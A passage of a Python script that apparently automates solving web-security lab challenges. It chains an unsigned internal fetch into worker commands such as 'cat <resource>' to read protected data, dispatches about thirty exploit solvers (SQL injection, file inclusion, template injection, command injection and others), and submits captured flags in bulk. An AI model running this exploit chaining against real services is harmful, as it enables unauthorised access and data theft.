      6. POST response_route a detector (kind=the unsigned executed event kind,
         signed=false) + repair (block internal fetch, require signed events,
         worker_allowlist = the benign signed commands e.g. ['status']) built from
         the schema -> 'incident_detected_and_remediated' with the proof."""
    url = url.rstrip("/")
    s = requests.Session(); s.headers.update(UA)
    clues = _clues(url)
    feat = clues.get("feature_route")
    sec = clues.get("secondary_route")
    final = clues.get("final_route")
    if not (feat and sec and final):
        return None
    evr = clues.get("evidence_route", "/api/evidence")
    resp = clues.get("response_route", "/api/response")
    reqlog = clues.get("request_log_route", "/api/requests")
    fetch_field = clues.get("fetch_query_field", "target")
    event_field = clues.get("event_json_field", "token")
    worker_field = clues.get("worker_query_field", "command")
    # 1) queued/unsigned internal fetch target from the request log
    recs = _j(_get(s, url + reqlog).text if _get(s, url + reqlog) else "").get("records", [])
    tgt = None
    for rec in recs:
        if rec.get("signed") is False and rec.get("outcome") == "queued":
            tgt = rec.get("target"); break
    if not tgt:
        for rec in recs:
            if rec.get("signed") is False or rec.get("outcome") == "queued":
                tgt = rec.get("target"); break
    if not tgt and recs:
        tgt = recs[-1].get("target")
    if not tgt:
        return None
    # 2) create the fetch event for that internal target
    _get(s, url + feat, params={fetch_field: tgt})
    # 3) verify the event -> dispatch the worker
    wr = _post(s, url + sec, json={event_field: tgt})
    wd = _j(wr.text) if wr is not None else {}
    resources = wd.get("resources") or ["objective"]
    cmds = wd.get("available_commands") or []
    # 4) run the benign signed command(s) + the unsigned read command
    for b in ([x for x in cmds if "<" not in x] or ["status"]):
        _get(s, url + final, params={worker_field: b})
    tpl = next((x for x in cmds if "<" in x), "cat <resource>")
    verb = tpl.split()[0] if tpl.split() else "cat"
    for res in resources:
        _get(s, url + final, params={worker_field: "%s %s" % (verb, res)})
    # 5) inspect the reproduced evidence -> schema + goal
    er = _get(s, url + evr)
    ev = _j(er.text) if er is not None else {}
    m = PROOF.search(json.dumps(ev))
    if m:
        return m.group(0)
    events = ev.get("events", [])
    schema = ev.get("response_schema", {})
    mal = next((e.get("kind") for e in events
                if e.get("signed") is False and e.get("outcome") == "executed"), None) \
        or next((e.get("kind") for e in events
                 if e.get("signed") is False and e.get("kind")), "worker.dispatch")
    benign = sorted({e.get("command") for e in events
                     if e.get("signed") is True and e.get("command")}) or ["status"]
    det_s = schema.get("detector", {"kind": "string", "signed": "boolean"})
    rep_s = schema.get("repair", {"block_internal_fetch": "boolean",
                                  "require_signed_event": "boolean",
                                  "worker_allowlist": "string[]"})
    detector = {k: (mal if t == "string" else (False if t == "boolean" else None))
                for k, t in det_s.items()}
    repair = {}
    for k, t in rep_s.items():
        repair[k] = True if t == "boolean" else (benign if "[]" in str(t) else mal)
    # 6) POST the analysis (schema-built first, then the known-good shape)
    for body in ({"detector": detector, "repair": repair},
                 {"detector": {"kind": mal, "signed": False},
                  "repair": {"block_internal_fetch": True, "require_signed_event": True,
                             "worker_allowlist": benign}}):
        pr = _post(s, url + resp, json=body)
        if pr is not None:
            m = PROOF.search(pr.text)
            if m:
                return m.group(0)
    return None

SOLVERS = {"backup": solve_backup, "idor": solve_idor, "sqli": solve_sqli,
           "lfi": solve_lfi, "admin": solve_admin,
           "reflect": solve_reflect, "stored": solve_stored, "session": solve_session,
           "csrf": solve_csrf, "upload": solve_upload,
           "ssti": solve_ssti, "delayedsqli": solve_delayed_sqli,
           "massassign": solve_massassign,
           "apiauthz": solve_apiauthz, "ssrf": solve_ssrf,
           "cmdinject": solve_cmdinject, "resettoken": solve_resettoken,
           "graphql": solve_graphql,
           "webhook": solve_webhook, "deserialize": solve_deserialize,
           "forwarded": solve_forwarded, "websocket": solve_websocket,
           "doublespend": solve_doublespend,
           "failopen": solve_failopen, "logaudit": solve_logaudit,
           "trustbuild": solve_trustbuild, "internalaffairs": solve_internalaffairs,
           "delegidentity": solve_delegidentity, "queuebind": solve_queuebind,
           "fullstack": solve_fullstack}

def solve_target(url):
    s, home = wait_ready(url)
    if not s or home in ("EXPIRED", None):
        return None
    clues = _clues(url)
    kind = detect(home, clues, url)
    # Dispatch the detected type first. The clue-driven types (reflect/stored/
    # session/csrf/upload) are chosen reliably from /api/clues, so we only blind-
    # fall-back among the cheap GET solvers plus the fast, idempotent-enough
    # feature-route solvers (ssti/delayedsqli/massassign) — never the slow
    # reviewer-bot 'stored' path or the cookie-planting 'session' path.
    order = [kind] + [k for k in ("graphql", "apiauthz", "resettoken", "cmdinject",
                                  "failopen", "webhook", "deserialize", "fullstack",
                                  "forwarded",
                                  "websocket", "admin", "ssti", "lfi", "backup",
                                  "idor", "sqli", "ssrf", "delayedsqli", "massassign",
                                  "trustbuild", "internalaffairs",
                                  "delegidentity", "queuebind",
                                  "logaudit", "doublespend") if k != kind]
    for k in order:
        try:
            pf = SOLVERS[k](url)
        except Exception:
            pf = None
        if pf:
            return pf
    return None

# ------------------------------------------------------------------ mode runner
def _provision(g, ch, op):
    # The single_solve route (base id, no "/") rejects run_for_time
    # ("timed_intent_not_available"); time_trial/mastery take it to pick the
    # regular (untimed) pool. Omit the key for single.
    body = {"op": op, "challenge": ch}
    if "/" in ch:
        body["run_for_time"] = False
    return g.post(body)

def run_mode(g, ch, do_submit=True):
    r = _provision(g, ch, "start")
    # already-solved or no fresh target -> retry provisions a new one
    if not r.get("targets"):
        r = _provision(g, ch, "retry")
    waited = 0
    while not r.get("targets") and waited < 90:
        time.sleep(4); waited += 4; r = g.status(ch)
    targets = {t["id"]: t["url"] for t in r.get("targets", [])}
    questions = r.get("questions", [])
    if not targets:
        print("  [%s] no target (slot busy?)" % ch); return False
    answers = {}
    for q in questions:
        url = targets.get(q.get("artifact")) or (list(targets.values())[0])
        pf = solve_target(url)
        print("  [%s] %s -> %s" % (ch, q["id"], pf))
        if pf:
            answers[q["id"]] = pf
    if not do_submit:
        return len(answers) == len(questions)
    if answers:
        res = g.submit(ch, answers)
        ok = res.get("result") in ("CORRECT", "accepted")
        print("  [%s] SUBMIT %s flag=%s" % (ch, res.get("result"), res.get("flag")))
        return ok
    return False

def solve_challenge(g, base, modes=("", "/time_trial", "/mastery"), do_submit=True):
    out = {}
    for m in modes:
        ch = base + m
        try:
            out[m or "single"] = run_mode(g, ch, do_submit)
        except Exception as e:
            print("  [%s] ERROR %s" % (ch, e)); out[m or "single"] = False
    return out

def backlog(g, do_submit=True):
    """Clear every UNSOLVED web mode across all released web challenges.
    Returns {ok,total,solved[],failed[],nothing_to_do}. Used by the CLI
    --backlog and by the webwatch monitor."""
    j = g.get("?op=list&lane=web&all=true").json()
    chs = j.get("challenges", []) if isinstance(j, dict) else j
    unsolved = {}
    for c in chs:
        cid = c.get("id", "")
        if not cid or c.get("solved"):
            continue
        base = cid.split("/")[0]
        suffix = "/" + cid.split("/", 1)[1] if "/" in cid else ""
        unsolved.setdefault(base, set()).add(suffix)
    out = {"ok": 0, "total": 0, "solved": [], "failed": [], "nothing_to_do": not unsolved}
    for base in sorted(unsolved):
        modes = tuple(sorted(unsolved[base]))
        print("web backlog: %s modes=%s" % (base, modes))
        res = solve_challenge(g, base, modes=modes, do_submit=do_submit)
        for k, v in res.items():
            out["total"] += 1
            cid = base + ("" if k == "single" else k)
            if v:
                out["ok"] += 1; out["solved"].append(cid)
            else:
                out["failed"].append(cid)
    return out

# ------------------------------------------------------------------ main
def main():
    args = sys.argv[1:]
    if "--url" in args:
        url = args[args.index("--url") + 1]
        print("proof:", solve_target(url)); return
    g = GM()
    do_submit = "--no-submit" not in args
    if "--backlog" in args:
        r = backlog(g, do_submit)
        if r["nothing_to_do"]:
            print("RESULT: web backlog nothing-to-do"); return
        print("RESULT: web backlog %d/%d" % (r["ok"], r["total"]))
        if r["failed"]:
            print("FAILED: " + ", ".join(r["failed"]))
        return
    if "--day" in args:
        day = args[args.index("--day") + 1]
        j = g.get("?op=list&lane=web&day=%s" % day).json()
        chs = j.get("challenges", []) if isinstance(j, dict) else j
        bases = sorted({c["id"] for c in chs if c.get("id") and "/" not in c["id"]})
        print("web day %s: %s" % (day, bases))
        total = ok = 0
        for b in bases:
            res = solve_challenge(g, b, do_submit=do_submit)
            for v in res.values():
                total += 1; ok += 1 if v else 0
        print("RESULT: web %d/%d" % (ok, total))
        return
    base = args[0]
    modes_arg = None
    if "--modes" in args:
        mm = args[args.index("--modes") + 1].split(",")
        mp = {"single": "", "tt": "/time_trial", "time_trial": "/time_trial", "mastery": "/mastery"}
        modes_arg = tuple(mp.get(x, x) for x in mm)
    res = solve_challenge(g, base, modes=modes_arg or ("", "/time_trial", "/mastery"), do_submit=do_submit)
    ok = sum(1 for v in res.values() if v)
    print("RESULT: %s %d/%d  %s" % (base, ok, len(res), res))

if __name__ == "__main__":
    main()
